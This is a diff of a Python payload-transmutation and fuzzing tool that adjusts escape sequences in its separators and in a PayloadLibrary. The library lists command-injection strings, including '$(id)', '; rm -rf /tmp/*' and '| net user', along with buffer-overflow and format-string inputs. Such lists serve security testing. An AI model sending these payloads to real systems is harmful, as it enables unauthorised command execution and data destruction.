@@ -47,9 +47,9 @@ class TransmuteConfig:
     def __post_init__(self):
         if self.custom_separators is None:
             self.custom_separators = {
-                "null": "\0",
+                "null": "\\0",
                 "space": " ",
-                "tab": "\t",
+                "tab": "\\t",
                 "custom": "|"
             }
 
@@ -99,7 +99,7 @@ class PayloadTransmuter:
         
         return result
     
-    def _null_padding(self, payload: str, separator: str = "\0") -> str:
+    def _null_padding(self, payload: str, separator: str = "\\0") -> str:
         """Null byte padding transmutation"""
         return separator.join(payload)
     
@@ -277,7 +277,7 @@ class PayloadLibrary:
             "$(id)",
             "; rm -rf /tmp/*",
             "| net user",
-            "&& dir C:\\",
+            "&& dir C:",
             "`ping -c 5 127.0.0.1`"
         ],
         "xss": [
@@ -307,7 +307,7 @@ class PayloadLibrary:
         ],
         "buffer_overflow": [
             "A" * 1000,
-            "\\x41" * 500 + "\\x42" * 500,
+            "\x41" * 500 + "\x42" * 500,
             "%s" * 100,
             "%.1000000x"
         ]
